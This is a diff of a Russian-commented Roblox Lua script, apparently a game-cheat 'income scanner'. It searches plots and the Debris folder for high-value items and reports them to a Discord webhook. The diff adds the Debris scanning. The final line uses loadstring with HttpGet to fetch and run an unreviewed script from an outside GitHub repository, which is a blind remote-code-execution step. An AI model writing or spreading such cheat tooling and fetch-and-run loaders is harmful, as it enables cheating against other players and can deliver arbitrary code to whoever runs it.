@@ -65,7 +65,6 @@ local OBJECTS = {
     ['Los Burritos'] = { emoji = '🌯', threshold = 250000000 },
     ['Reinito Sleighito'] = { emoji = '🦌', threshold = 25000000 },
     ['Dragon Gingerini'] = { emoji = '🫚', threshold = 10000000 },
-    
 }
 
 -- 💰 ПАРСЕР ДОХОДА
@@ -197,6 +196,46 @@ local function isGuidName(s)
     return s:match('^[0-9a-fA-F]+%-%x+%-%x+%-%x+%-%x+$') ~= nil
 end
 
+-- 🔍 ФУНКЦИЯ ПОИСКА ПРИБЫЛИ В DEBRIS FOLDER
+local function scanDebrisForIncome()
+    local DebrisFolder = workspace:FindFirstChild("Debris")
+    if not DebrisFolder then 
+        print("⚠️ Папка Debris не найдена")
+        return {} 
+    end
+
+    local results = {}
+
+    for _, inst in ipairs(DebrisFolder:GetDescendants()) do
+        if inst.Name == "FastOverheadTemplate" then
+            local gui = inst:FindFirstChild("GUI")
+            local name = gui and grabText(gui:FindFirstChild("DisplayName")) or nil
+            local genInst = gui and gui:FindFirstChild("Generation")
+            local genText = genInst and grabText(genInst) or nil
+            local genNum = genText and parseGenerationText(genText) or nil
+
+            if name and genNum then
+                table.insert(results, { name = name, genText = genText, gen = genNum, location = "Debris" })
+            end
+        end
+    end
+
+    -- Сортировка по доходу (убывание)
+    table.sort(results, function(a, b) return a.gen > b.gen end)
+
+    -- Вывод в консоль
+    if #results > 0 then
+        print("\n📊 НАЙДЕНО В DEBRIS FOLDER:")
+        for _, r in ipairs(results) do
+            print(string.format("   %s - %s (%.0f/s)", r.name, r.genText, r.gen))
+        end
+    else
+        print("📭 В Debris folder объектов не найдено")
+    end
+
+    return results
+end
+
 -- 🔍 ПОЛНЫЕ СКАНЕРЫ
 local function scanPlots()
     local results = {}
@@ -323,6 +362,7 @@ local function collectAll(timeoutSec)
             scanRunway(),
             scanAllOverheads(),
             scanPlayerGui(),
+            scanDebrisForIncome(), -- Добавлен сканирование Debris
         }
 
         for _, source in ipairs(allSources) do
@@ -390,11 +430,12 @@ local function sendDiscordNotification(filteredObjects)
         table.insert(
             objectsList,
             string.format(
-                '%s **%s** (%s) - порог: %s',
+                '%s **%s** (%s) - порог: %s | %s',
                 emoji,
                 obj.name,
                 formatIncomeNumber(obj.gen),
-                formatIncomeNumber(threshold)
+                formatIncomeNumber(threshold),
+                obj.location or 'Unknown'
             )
         )
     end
@@ -463,6 +504,11 @@ end
 -- 🎮 ГЛАВНАЯ ФУНКЦИЯ
 local function scanAndNotify()
     print('🔍 Сканирую все объекты...')
+    
+    -- Сначала сканируем Debris отдельно для вывода в консоль
+    scanDebrisForIncome()
+    
+    -- Затем собираем все объекты
     local allFound = collectAll(8.0)
 
     -- Фильтрация по индивидуальным порогам
@@ -478,6 +524,7 @@ local function scanAndNotify()
     end
 
     -- Вывод в консоль
+    print('\n📊 ОБЩИЙ ОТЧЕТ:')
     print('Найдено всего объектов:', #allFound)
     print('Выше порога:', #filtered)
 
@@ -510,6 +557,7 @@ end
 print('🎯 === BRAINROT INCOME SCANNER (ИНДИВИДУАЛЬНЫЕ ПОРОГИ) ===')
 print('💡 Каждый объект имеет свой порог уведомления')
 print('⚙️  Настрой пороги в разделе OBJECTS')
+print('📁 Добавлено сканирование Debris folder')
 
 -- Показываем текущие пороги
 print('\n📊 ТЕКУЩИЕ ПОРОГИ:')
@@ -539,4 +587,7 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
+print('📁 Debris сканирование активно')
+
+-- Загрузка дополнительного скрипта
 loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
